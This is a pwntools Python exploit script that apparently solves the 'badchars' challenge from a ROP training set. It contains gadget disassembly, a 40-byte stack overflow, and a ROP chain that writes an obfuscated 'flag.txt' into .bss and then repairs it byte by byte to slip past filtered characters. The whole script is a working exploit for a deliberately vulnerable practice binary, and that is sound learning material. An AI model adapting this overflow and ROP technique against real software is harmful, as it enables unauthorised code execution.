from pwn import *
context.binary = elf = ELF('badchars')
'''

0x004006a3                 5f  pop rdi
0x004006a4                 c3  ret

0x0040069c               415c  pop r12
0x0040069e               415d  pop r13
0x004006a0               415e  pop r14
0x004006a2               415f  pop r15
0x004006a4                 c3  ret

;-- usefulGadgets:
0x00400628      453037         xor byte [r15], r14b
0x0040062b      c3             ret
0x0040062c      450037         add byte [r15], r14b
0x0040062f      c3             ret
0x00400630      452837         sub byte [r15], r14b
0x00400633      c3             ret
0x00400634      4d896500       mov qword [r13], r12
0x00400638      c3             ret


[Sections]
nth paddr        size vaddr       vsize perm name
―――――――――――――――――――――――――――――――――――――――――――――――――
18  0x00000df0    0x8 0x00600df0    0x8 -rw- .init_array
19  0x00000df8    0x8 0x00600df8    0x8 -rw- .fini_array
20  0x00000e00  0x1f0 0x00600e00  0x1f0 -rw- .dynamic
21  0x00000ff0   0x10 0x00600ff0   0x10 -rw- .got
22  0x00001000   0x28 0x00601000   0x28 -rw- .got.plt
23  0x00001028   0x10 0x00601028   0x10 -rw- .data
24  0x00001038    0x0 0x00601038    0x8 -rw- .bss


'''

offset = 40
pop_rdi = 0x004006a3
pop_r14_r15   = 0x004006a0
pop_r12_r13_r14_r15 = 0x0040069c
ret = 0x00400638

xor_mr15_r14b = 0x00400628
add_mr15_r14b = 0x0040062c
sub_mr15_r14b = 0x00400630
mov_mr13_r12  = 0x00400634

print_plt = 0x00400510

# x g a .
badchars = [0x78, 0x67, 0x61, 0x2e]
# replace with 0x76(v), 0x68(h), 0x62(b), 0x2f (/)
#what = unpack(b'flag.txt')
where = 0x00601038
what  = unpack(b'flbh/twt')

sub_at_a = where + 2
sub_at_g = where + 3
sub_at_dot = where + 4
add_at_x = where + 6


payload  = b'A'*offset + p64(pop_r12_r13_r14_r15) + p64(what) + p64(where) + p64(0x1) + p64(sub_at_a) + p64(mov_mr13_r12) + p64(sub_mr15_r14b) 
payload += p64(pop_r14_r15) + p64(0x1) + p64(sub_at_g)   + p64(sub_mr15_r14b)
payload += p64(pop_r14_r15) + p64(0x1) + p64(sub_at_dot) + p64(sub_mr15_r14b)
payload += p64(pop_r14_r15) + p64(0x1) + p64(add_at_x)   + p64(add_mr15_r14b)
payload += p64(pop_rdi) + p64(where)
payload += p64(ret) + p64(print_plt)


p = elf.process()
#gdb.attach(p)

p.recv()
p.sendline(payload)
log.info(p.recvall())




